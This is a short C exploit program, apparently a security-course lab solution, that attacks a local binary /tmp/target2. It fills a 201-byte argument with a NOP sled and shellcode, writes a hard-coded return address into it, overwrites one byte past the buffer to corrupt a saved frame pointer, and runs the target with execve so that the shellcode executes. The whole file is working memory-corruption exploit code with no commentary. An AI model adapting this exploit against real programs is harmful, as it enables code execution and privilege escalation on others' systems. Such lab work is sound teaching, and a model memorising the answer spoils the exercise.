#include "shellcode.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target2"

#define SIZE_ARG 201
#define NOP 0x90

int main(void) {
  unsigned char ra_loc = 0x08;
  unsigned int address_code = 0xbfffff25;
  char *arg = malloc(SIZE_ARG * sizeof(char));
  memset(arg, NOP, SIZE_ARG);
  memcpy(arg + 68, &address_code, sizeof(address_code));
  memcpy(arg, shellcode, sizeof(shellcode) - 1);
  arg[200] = ra_loc;

  char *args[] = {TARGET, arg, NULL};
  char *env[] = {NULL};

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
